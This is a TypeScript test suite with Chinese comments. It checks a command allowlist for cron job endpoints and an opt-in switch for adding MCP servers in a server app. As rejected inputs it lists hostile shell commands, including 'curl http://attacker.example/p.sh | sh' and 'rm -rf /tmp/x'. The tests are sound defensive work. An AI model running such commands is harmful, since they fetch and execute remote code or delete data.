// ── P0 加固对抗套件：通道三(cron command 白名单化双入口 + MCP add 显式开关) ──
// 树 p0fix3-trilc-http / 节点 PD-T，TestEngineer 小柯 fresh 实例（20260827T074800Z）。
//
// 审计真源：docs/workflow/operating-records/2026-W35/trees/rmc-audit-cmp-001/reports/
// rmc-TriLC.md P0-1（发现 8）三条任意命令执行通道中的两条：(a) POST/PATCH cron jobs
// 携带任意 command 经 timer.ts spawn('/bin/sh'|'cmd.exe') 原样执行；(c) MCP add 把
// body.command/args/env 直传 connectServer 启动子进程。通道(b) bypassPermissions 任务流
// 缺省收紧明确不入本树范围（计划两步走，见树 reports/verify.md §3③）。
//
// 修复语义与文案契约钉死（src/server/app.ts，行号为 TriRLC HEAD=26720dd 工作树 Read 实证）：
//   cron POST 创建拦截      ：3557-3573（JSON 解析后、addJob 前）→ 403 {"ok":false,"error":"command_not_allowed"}
//   cron PATCH 更新拦截     :3604-3628（id 正则与 JSON 解析后、updateJob 前）→ 同上形状
//   缺省口径                TRILC_CRON_COMMAND_ALLOWLIST 未配置/空串 ⇒ 空集 ⇒ 一切携带
//                           非空白 command 的 HTTP 载荷拒；不携带 command 的
//                           heartbeat/systemPrompt 型 job 不受影响；本地原生创建路径不经 HTTP 不在本门射程。
//   白名单匹配              逗号分隔精确等值，条目与命令两侧均 trim(:221-228)，不做前缀/通配/大小写折叠。
//   MCP add 开关            :3869-3878 未置 TRILC_MCP_RUNTIME_ADD='1'/'true' ⇒ 403
//                           {"error":"mcp_runtime_add_disabled"}（注意：错误体无 ok 字段，
//                           与 cron 族错误体形状刻意不同）；请求期读 env。
//
// 分层：cronCommandHttpAllowed 单元直测 + createTriRLCApp 真起服端到端（起服配方对齐
// test/server/tasks-submit-weekly-hint.test.ts 先例；恒附正确 x-internal-token 以隔离
// 通道一/二门，只考察本文件的两个入口级闸门）。
//
// 诚实申报：静态推演产物（fresh TestEngineer 实例无 Bash 面，全部用例未经运行），终值
// 以编排层按树 reports/verify.md §2 等价口径重开门禁实测为准；低静态置信处在用例旁
// 注释标注「推演待实证」。

import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { request as httpRequest } from 'node:http';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createTriRLCApp, cronCommandHttpAllowed } from '../../src/server/app.js';

/** 用后还原 env 的最小封装。 */
function withEnv(key: string, value: string | undefined): () => void {
  const prev = process.env[key];
  if (value === undefined) delete process.env[key];
  else process.env[key] = value;
  return () => {
    if (prev === undefined) delete process.env[key];
    else process.env[key] = prev;
  };
}

// ══════════════════════ 单元层：cronCommandHttpAllowed ══════════════════════

describe('P0 通道三单元层：cronCommandHttpAllowed（app.ts:216-228）', () => {
  it('c1 allowlist 未配置（缺省空集）× 非空白命令 → 一律 false（fail-closed 根基）', () => {
    const restore = withEnv('TRILC_CRON_COMMAND_ALLOWLIST', undefined);
    try {
      assert.strictEqual(cronCommandHttpAllowed('curl http://attacker.example/p.sh | sh'), false);
      assert.strictEqual(cronCommandHttpAllowed('rm -rf /tmp/x'), false);
    } finally {
      restore();
    }
  });

  it('c2 空串与纯空白命令视为「不携带有效 command」→ true（heartbeat/systemPrompt 型 job 口径）', () => {
    const restore = withEnv('TRILC_CRON_COMMAND_ALLOWLIST', undefined);
    try {
      assert.strictEqual(cronCommandHttpAllowed(''), true);
      assert.strictEqual(cronCommandHttpAllowed('   '), true);
    } finally {
      restore();
    }
  });

  it('c3 非 string 放行既定口径：undefined/null/数字/对象/数组一律 true（typeof 门 :222）', () => {
    const restore = withEnv('TRILC_CRON_COMMAND_ALLOWLIST', undefined);
    try {
      assert.strictEqual(cronCommandHttpAllowed(undefined), true);
      assert.strictEqual(cronCommandHttpAllowed(null), true);
      assert.strictEqual(cronCommandHttpAllowed(42), true);
      assert.strictEqual(cronCommandHttpAllowed({ exec: 'sh' }), true);
      assert.strictEqual(cronCommandHttpAllowed(['ls -la']), true);
    } finally {
      restore();
    }
  });

  it('c4 精确等值命中 → true', () => {
    const restore = withEnv('TRILC_CRON_COMMAND_ALLOWLIST', 'npm run build,git status');
    try {
      assert.strictEqual(cronCommandHttpAllowed('npm run build'), true);
      assert.strictEqual(cronCommandHttpAllowed('git status'), true);
    } finally {
      restore();
    }
  });

  it('c5 条目侧空白剔除：配置条目带首尾空白仍参与等值比对（:225 map trim）', () => {
    const restore = withEnv('TRILC_CRON_COMMAND_ALLOWLIST', '  git status  ');
    try {
      assert.strictEqual(cronCommandHttpAllowed('git status'), true);
    } finally {
      restore();
    }
  });

  it('c6 命令侧空白对称 trim：带首尾空白的真实命令命中去噪后的自身（:227 trim 后比对）', () => {
    const restore = withEnv('TRILC_CRON_COMMAND_ALLOWLIST', 'npm run build');
    try {
      assert.strictEqual(cronCommandHttpAllowed('  npm run build  '), true);
    } finally {
      restore();
    }
  });

  it('c7 大小写不折叠：BUILD ≠ build（精确等值无常量折算，防误放宽）', () => {
    const restore = withEnv('TRILC_CRON_COMMAND_ALLOWLIST', 'npm run build');
    try {
      assert.strictEqual(cronCommandHttpAllowed('npm run BUILD'), false);
    } finally {
      restore();
    }
  });

  it('c8 无前缀/无通配/无子串语义：追加参数与前缀包裹均不命中（:227 includes 精确等值）', () => {
    const restore = withEnv('TRILC_CRON_COMMAND_ALLOWLIST', 'npm run build');
    try {
      assert.strictEqual(cronCommandHttpAllowed('npm run build --silent'), false);
      assert.strictEqual(cronCommandHttpAllowed('echo npm run build'), false);
    } finally {
      restore();
    }
  });

  it("c9 空壳环境（'' 与纯逗号）等价空集：非空命令一概 false", () => {
    for (const cfg of ['', ',,,']) {
      const restore = withEnv('TRILC_CRON_COMMAND_ALLOWLIST', cfg);
      try {
        assert.strictEqual(cronCommandHttpAllowed('anything --bad'), false, `cfg=${JSON.stringify(cfg)}`);
      } finally {
        restore();
      }
    }
  });
});

// ══════════════════════ 端到端层：POST/PATCH 双入口与 MCP 开关 ══════════════════════

const TEST_INTERNAL_TOKEN = 'pd-t-cron-guard-fixed-token';

describe('P0 通道三端到端：createTriRLCApp 真实 HTTP 双入口拦截与 MCP 开关', () => {
  let app: ReturnType<typeof createTriRLCApp>;
  let appPort: number;
  let tmpDataDir: string;

  const SAVED_ENV = {
    TRILC_DATA_DIR: process.env.TRILC_DATA_DIR,
    TRILC_PORT: process.env.TRILC_PORT,
    TRIMODEL_API_TOKEN: process.env.TRIMODEL_API_TOKEN,
    TRILC_INTERNAL_TOKEN: process.env.TRILC_INTERNAL_TOKEN,
    TRILC_CRON_COMMAND_ALLOWLIST: process.env.TRILC_CRON_COMMAND_ALLOWLIST,
    TRILC_MCP_RUNTIME_ADD: process.env.TRILC_MCP_RUNTIME_ADD,
  };

  /** node:http 裸请求 helper（对齐 auth-gate-rejection 同型手法）。 */
  async function rawRequest(
    path: string,
    opts: { method?: string; headers?: Record<string, string>; body?: string } = {},
  ): Promise<{ status: number; json: any }> {
    return new Promise((resolve, reject) => {
      const req = httpRequest(
        {
          host: '127.0.0.1',
          port: appPort,
          path,
          method: opts.method ?? 'GET',
          headers: {
            // 恒附正确 token 与 Host 自动补全，隔离通道一/二门，聚焦本文件闸门。
            'content-type': 'application/json',
            'x-internal-token': TEST_INTERNAL_TOKEN,
            ...(opts.headers ?? {}),
          },
        },
        (res) => {
          const chunks: Buffer[] = [];
          res.on('data', (chunk: Buffer) => chunks.push(chunk));
          res.on('end', () => {
            const text = Buffer.concat(chunks).toString('utf-8');
            let json: any = null;
            try { json = JSON.parse(text); } catch { /* 非 JSON 响应保留 null */ }
            resolve({ status: res.statusCode ?? 0, json });
          });
        },
      );
      req.on('error', reject);
      if (opts.body !== undefined) req.write(opts.body);
      req.end();
    });
  }

  before(async () => {
    tmpDataDir = mkdtempSync(join(tmpdir(), 'trilc-cronguard-'));
    process.env.TRILC_DATA_DIR = tmpDataDir;
    process.env.TRILC_PORT = '0';
    delete process.env.TRIMODEL_API_TOKEN;
    process.env.TRILC_INTERNAL_TOKEN = TEST_INTERNAL_TOKEN;
    // 刻意不设 TRILC_CRON_COMMAND_ALLOWLIST 与 TRILC_MCP_RUNTIME_ADD：
    // 缺省 fail-closed 是本文件的第一被测行为。

    const { readEnv } = await import('../../src/config/env.js');
    const env = readEnv();
    env.port = 0;
    env.trimodelApiUrl = 'http://127.0.0.1:1'; // 死端口快速降级，零外呼

    app = createTriRLCApp(env);
    await app.start();
    appPort = env.port;
    if (!appPort) throw new Error('app did not bind a port');
  });

  after(async () => {
    for (const [k, v] of Object.entries(SAVED_ENV)) {
      if (v === undefined) delete process.env[k];
      else (process.env as Record<string, string | undefined>)[k] = v;
    }
    try { await app.stop(); } catch { /* swallow */ }
    for (let attempt = 0; attempt < 5; attempt++) {
      try { rmSync(tmpDataDir, { recursive: true, force: true }); break; } catch {
        await new Promise((r) => setTimeout(r, 250));
      }
    }
  });

  it('g1 POST 创建 × 白名单外 command → 403 全形状钉死（拦在 addJob 前，引擎零触达）', async () => {
    const res = await rawRequest('/internal/v1/cron/jobs', {
      method: 'POST',
      body: JSON.stringify({ name: 'pd-t-guard-probe', command: 'curl http://attacker.example/p.sh | sh' }),
    });
    assert.equal(res.status, 403);
    // ok:false 与 error 字符串双双逐字比对＝实现契约的形状级 pin。
    assert.deepEqual(res.json, { ok: false, error: 'command_not_allowed' });
  });

  it('g2 PATCH 更新 × 白名单外 command × 不存在的 id → 403（≠not_found＝拦截位在 updateJob 之前的死证）', async () => {
    // 关键区分设计：若此处不拦而走到 updateJob，因 id 不存在应得 404；
    // 实测 403 说明补丁载荷在查询前即被白名单截停（PATCH 可改 command 字段的 P0 向量收口）。
    const res = await rawRequest('/internal/v1/cron/jobs/pd-t-no-such-id', {
      method: 'PATCH',
      body: JSON.stringify({ command: 'sh -c id > /tmp/pwned' }),
    });
    assert.equal(res.status, 403);
    assert.deepEqual(res.json, { ok: false, error: 'command_not_allowed' });
    assert.notEqual((res.json ?? {}).error, 'not_found');
  });

  it('g3 PATCH 对照组 × 不携带 command × 同一不存在 id → 404 not_found（证明 g2 的 403 来自 command 门而非 PATCH 整体封禁）', async () => {
    const res = await rawRequest('/internal/v1/cron/jobs/pd-t-no-such-id', {
      method: 'PATCH',
      body: JSON.stringify({ enabled: false }),
    });
    assert.equal(res.status, 404);
    assert.deepEqual(res.json, { ok: false, error: 'not_found' });
  });

  it('g4 PATCH × 非法 JSON → 400 invalid_json（工序位死证：JSON 解析先于白名单比对 :3618→:3624）', async () => {
    const res = await rawRequest('/internal/v1/cron/jobs/pd-t-no-such-id', {
      method: 'PATCH',
      body: '{"broken',
    });
    assert.equal(res.status, 400);
    assert.deepEqual(res.json, { ok: false, error: 'invalid_json' });
  });

  it('g5 POST × allowlist 运行中注入精确命中 → 201 真实落库（正向锚：门放行且引擎可用性未破坏）', async () => {
    const restore = withEnv('TRILC_CRON_COMMAND_ALLOWLIST', 'probe-ok-command');
    try {
      const res = await rawRequest('/internal/v1/cron/jobs', {
        method: 'POST',
        body: JSON.stringify({
          name: 'pd-t-guard-positive',
          command: 'probe-ok-command',
          // store.addJob 裸取 input.schedule.kind（src/cron/store.ts:211），payload 必带
          // schedule；every 分支以 String(everyMs) 落列。enabled:false+40 天间隔双重保证
          // 探针 job 在本用例时间窗内绝无触发可能。
          schedule: { kind: 'every', everyMs: 3456000000 },
          enabled: false,
        }),
      });
      // 推演待实证（置信高）：201 依据为 store.ts:207-231 的插入路径对本 payload
      // 全字段静态成立；若上游引入新必填校验翻红即为真实契约变化信号。
      assert.equal(res.status, 201);
      assert.equal(res.json?.ok, true);
      assert.equal(typeof res.json?.job?.id, 'string');
      assert.equal(res.json?.job?.command, 'probe-ok-command');
    } finally {
      restore();
    }
  });

  it('g6 POST × 不携带 command（systemPrompt 型）× allowlist 保持未配置 → 201 不受影响（豁免口径端到端死证）', async () => {
    const res = await rawRequest('/internal/v1/cron/jobs', {
      method: 'POST',
      body: JSON.stringify({
        name: 'pd-t-heartbeat-shaped-probe',
        systemPrompt: 'heartbeat 型探针：仅验证空集下不带 command 不受影响',
        schedule: { kind: 'every', everyMs: 3456000000 },
        enabled: false,
      }),
    });
    assert.equal(res.status, 201);
    assert.equal(res.json?.ok, true);
    assert.equal(res.json?.job?.systemPrompt, 'heartbeat 型探针：仅验证空集下不带 command 不受影响');
    assert.equal(res.json?.job?.command ?? null, null);
  });

  it('g7 MCP add × 开关缺省禁用 → 403 错误体无 ok 字段（deepEqual 键集全等把形状差异一并钉死）', async () => {
    const res = await rawRequest('/internal/v1/mcp/servers/add', {
      method: 'POST',
      body: JSON.stringify({ name: 'pd-t-mcp-x', type: 'stdio', command: 'echo hi' }),
    });
    assert.equal(res.status, 403);
    // 与 cron 族 {"ok":false,...} 的形状差异是刻意契约：此断言同时锁定「没有 ok 键」。
    assert.deepEqual(res.json, { error: 'mcp_runtime_add_disabled' });
  });

  it("g8 MCP add × 开关显式置 'true' × 残缺 JSON 体 → 500 mcp_add_failed（越过开关进入业务 try 的通道证）", async () => {
    // try 内次序实证自源码 :3880-3883：chunks 聚合 → JSON.parse 抛 SyntaxError →
    // 动态 import('../tools/mcp-tool.js') 尚未执行 ⇒ 本例零 MCP 连接副作用即证开关生效。
    // 推演待实证：该次序来自逐行 Read，静态置信高但未运行。
    const restore = withEnv('TRILC_MCP_RUNTIME_ADD', 'true');
    try {
      const res = await rawRequest('/internal/v1/mcp/servers/add', {
        method: 'POST',
        body: '{"bad',
      });
      assert.equal(res.status, 500);
      assert.equal((res.json ?? {}).error, 'mcp_add_failed');
    } finally {
      restore();
    }
  });

  it("g9 开关仅认字面 '1'/'true'：'TRUE'/'yes'/'0' 三变体全数 403 同形（:3874 字面量精确比对）", async () => {
    for (const flag of ['TRUE', 'yes', '0']) {
      const restore = withEnv('TRILC_MCP_RUNTIME_ADD', flag);
      try {
        const res = await rawRequest('/internal/v1/mcp/servers/add', {
          method: 'POST',
          body: JSON.stringify({ name: `pd-t-flag-${flag}` }),
        });
        assert.equal(res.status, 403, `flag=${flag}`);
        assert.deepEqual(res.json, { error: 'mcp_runtime_add_disabled' }, `flag=${flag}`);
      } finally {
        restore();
      }
    }
  });
});
